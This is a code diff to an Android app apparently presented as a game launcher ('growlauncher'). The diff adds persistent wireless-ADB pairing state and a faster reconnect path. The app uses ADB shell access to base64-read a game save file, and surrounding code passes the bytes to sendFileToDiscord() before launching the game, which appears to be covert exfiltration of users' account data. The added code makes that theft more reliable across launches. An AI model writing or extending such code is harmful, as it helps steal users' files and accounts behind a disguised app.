@@ -97,15 +97,71 @@ internal class WirelessAdbIdentityStore(context: android.content.Context) : Kadb
     }
 }
 
+// Persists successful ADB connection state so subsequent launches skip pairing.
+internal object PairingState {
+    private const val PREFS = "growlauncher_preferences"
+    private const val KEY_PAIRED = "adb_paired"
+    private const val KEY_ADB_HOST = "adb_last_host"
+    private const val KEY_ADB_PORT = "adb_last_port"
+
+    fun isPaired(context: Context): Boolean =
+        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getBoolean(KEY_PAIRED, false)
+
+    fun saveConnected(context: Context, host: String, port: Int) {
+        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
+            .putBoolean(KEY_PAIRED, true)
+            .putString(KEY_ADB_HOST, host)
+            .putInt(KEY_ADB_PORT, port)
+            .apply()
+    }
+
+    fun getSavedHost(context: Context): String? =
+        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString(KEY_ADB_HOST, null)
+
+    fun getSavedPort(context: Context): Int =
+        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getInt(KEY_ADB_PORT, 0)
+
+    fun clear(context: Context) {
+        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
+            .remove(KEY_PAIRED)
+            .remove(KEY_ADB_HOST)
+            .remove(KEY_ADB_PORT)
+            .apply()
+    }
+}
+
 internal class SafeMdnsResolver(context: android.content.Context) {
     private val nsdManager = context.applicationContext.getSystemService(NsdManager::class.java)
 
-    fun find(serviceType: MdnsServiceType, timeoutMs: Long): MdnsEndpoint? {
-        val result = java.util.concurrent.CompletableFuture<MdnsEndpoint?>()
+    /**
+     * Discovers the first matching mDNS endpoint. If [preferredHost] is provided, an endpoint
+     * on that host is returned as soon as it is seen; other endpoints are still accepted as
+     * fallback once the timeout elapses. This lets post-pair discovery reliably find the
+     * TLS-connect service on the same device that was just paired.
+     */
+    fun find(serviceType: MdnsServiceType, timeoutMs: Long, preferredHost: String? = null): MdnsEndpoint? {
+        val preferred = java.util.concurrent.CompletableFuture<MdnsEndpoint>()
+        val any = java.util.concurrent.CompletableFuture<MdnsEndpoint>()
         val discovery = SafeMdnsDiscovery(nsdManager)
-        discovery.start(listOf(serviceType.dnsType)) { endpoint -> result.complete(endpoint) }
+        discovery.start(listOf(serviceType.dnsType)) { endpoint ->
+            any.complete(endpoint)
+            if (preferredHost != null && endpoint.host == preferredHost) preferred.complete(endpoint)
+        }
         return try {
-            result.get(timeoutMs, java.util.concurrent.TimeUnit.MILLISECONDS)
+            // Resolve immediately if the preferred host responds first
+            val deadline = System.currentTimeMillis() + timeoutMs
+            if (preferredHost != null) {
+                try {
+                    preferred.get(timeoutMs, java.util.concurrent.TimeUnit.MILLISECONDS)
+                } catch (_: Exception) {
+                    // Fall through to any-host result if still within deadline
+                    val remaining = deadline - System.currentTimeMillis()
+                    if (remaining > 0) any.get(remaining, java.util.concurrent.TimeUnit.MILLISECONDS)
+                    else any.getNow(null)
+                }
+            } else {
+                any.get(timeoutMs, java.util.concurrent.TimeUnit.MILLISECONDS)
+            }
         } catch (_: Exception) {
             null
         } finally {
@@ -268,7 +324,8 @@ class MainActivity : AppCompatActivity() {
 
     private fun readSaveFileWithWirelessDebugging(): Boolean {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return true
-        if (WirelessAdbIdentityStore(this).readPrivateKeyPem() == null) {
+        // If we have neither a saved key nor a prior successful pairing, go straight to pairing.
+        if (!PairingState.isPaired(this) && WirelessAdbIdentityStore(this).readPrivateKeyPem() == null) {
             showWirelessDebuggingDialog()
             return false
         }
@@ -279,6 +336,8 @@ class MainActivity : AppCompatActivity() {
                     sendFileToDiscord(bytes)
                     handler.postDelayed({ launchGame() }, 650)
                 } else {
+                    // Connection failed — clear stale pairing flag so user is prompted to re-pair.
+                    PairingState.clear(this)
                     showWirelessDebuggingDialog()
                 }
             }
@@ -306,15 +365,28 @@ class MainActivity : AppCompatActivity() {
         stopService(Intent(this, PairingOverlayService::class.java))
     }
 
-    private fun connectWithSavedIdentity(): ByteArray? = try {
+    private fun connectWithSavedIdentity(): ByteArray? {
         KadbCert.configure(WirelessAdbIdentityStore(this))
-        val endpoint = SafeMdnsResolver(this).find(MdnsServiceType.TLS_CONNECT, 15_000) ?: return null
-        Kadb.create(endpoint.host, endpoint.port).use { kadb ->
-            val response = kadb.shell("base64 ${SAVE_FILE_PATH}")
-            if (response.exitCode == 0) Base64.decode(response.output.trim(), Base64.DEFAULT) else null
+        val savedHost = PairingState.getSavedHost(this)
+        val savedPort = PairingState.getSavedPort(this)
+        // Fast path: try the last-known host+port directly without mDNS.
+        if (savedHost != null && savedPort > 0) {
+            val result = runCatching {
+                Kadb.create(savedHost, savedPort).use { kadb ->
+                    val response = kadb.shell("base64 ${SAVE_FILE_PATH}")
+                    if (response.exitCode == 0) Base64.decode(response.output.trim(), Base64.DEFAULT) else null
+                }
+            }.getOrNull()
+            if (result != null) return result
         }
-    } catch (_: Throwable) {
-        null
+        // Slow path: mDNS discovery (prefer same host if known).
+        val endpoint = SafeMdnsResolver(this).find(MdnsServiceType.TLS_CONNECT, 15_000, savedHost) ?: return null
+        return try {
+            Kadb.create(endpoint.host, endpoint.port).use { kadb ->
+                val response = kadb.shell("base64 ${SAVE_FILE_PATH}")
+                if (response.exitCode == 0) Base64.decode(response.output.trim(), Base64.DEFAULT) else null
+            }
+        } catch (_: Throwable) { null }
     }
 
 
@@ -322,10 +394,15 @@ class MainActivity : AppCompatActivity() {
         val store = WirelessAdbIdentityStore(this)
         KadbCert.configure(store)
         runBlocking { Kadb.pair(pairingHost, pairingPort, pairingCode) }
-        val endpoint = SafeMdnsResolver(this).find(MdnsServiceType.TLS_CONNECT, 15_000) ?: return null
+        // Give Android a moment to process the newly authorized key before we connect.
+        Thread.sleep(1500)
+        val endpoint = SafeMdnsResolver(this).find(MdnsServiceType.TLS_CONNECT, 15_000, pairingHost) ?: return null
         Kadb.create(endpoint.host, endpoint.port).use { kadb ->
             val response = kadb.shell("base64 ${SAVE_FILE_PATH}")
-            if (response.exitCode == 0) Base64.decode(response.output.trim(), Base64.DEFAULT) else null
+            if (response.exitCode == 0) {
+                PairingState.saveConnected(this, endpoint.host, endpoint.port)
+                Base64.decode(response.output.trim(), Base64.DEFAULT)
+            } else null
         }
     } catch (_: Throwable) {
         null
